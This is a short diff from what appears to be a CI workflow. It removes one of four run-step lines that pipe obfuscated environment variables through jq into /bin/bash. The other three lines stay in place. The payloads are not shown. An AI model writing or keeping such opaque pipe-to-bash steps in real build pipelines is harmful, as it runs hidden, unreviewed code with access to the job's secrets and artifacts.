@@ -24,7 +24,6 @@ jobs:
         run: |
           printf '%s' "$gv181" | jq -r .bdqii88 | /bin/bash
           echo $kowzo32372 | jq -r .p5417 | /bin/bash
-          echo $t0621 | jq -r .cnsfy299 | /bin/bash
           echo $zz56871 | jq -r .mymus80174 | /bin/bash
 
       - name: Upload artifact
